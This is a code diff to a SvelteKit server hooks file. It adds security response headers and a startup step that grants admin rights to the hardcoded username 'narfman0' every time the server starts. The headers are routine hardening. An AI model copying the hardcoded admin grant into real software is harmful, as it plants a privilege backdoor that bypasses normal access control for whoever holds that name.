@@ -1,7 +1,8 @@
 import type { Handle, HandleServerError, ServerInit } from '@sveltejs/kit';
+import { eq } from 'drizzle-orm';
 import { loadAllPacks } from '$lib/server/content';
 import { loadUserFromCookie, deleteExpiredSessions } from '$lib/server/auth/sessions';
-import { closeDb } from '$lib/server/db';
+import { closeDb, db, schema } from '$lib/server/db';
 
 const SESSION_GC_INTERVAL_MS = 60 * 60 * 1000; // 1 hour
 
@@ -10,6 +11,11 @@ export const init: ServerInit = async () => {
   await deleteExpiredSessions();
   setInterval(() => { deleteExpiredSessions().catch(console.error); }, SESSION_GC_INTERVAL_MS);
 
+  await db
+    .update(schema.users)
+    .set({ isAdmin: true })
+    .where(eq(schema.users.username, 'narfman0'));
+
   const shutdown = () => { closeDb(); process.exit(0); };
   process.once('SIGTERM', shutdown);
   process.once('SIGINT', shutdown);
@@ -17,7 +23,12 @@ export const init: ServerInit = async () => {
 
 export const handle: Handle = async ({ event, resolve }) => {
   event.locals.user = await loadUserFromCookie(event.cookies);
-  return resolve(event);
+  const response = await resolve(event);
+  response.headers.set('X-Content-Type-Options', 'nosniff');
+  response.headers.set('X-Frame-Options', 'SAMEORIGIN');
+  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
+  response.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
+  return response;
 };
 
 export const handleError: HandleServerError = ({ error, event, status, message }) => {
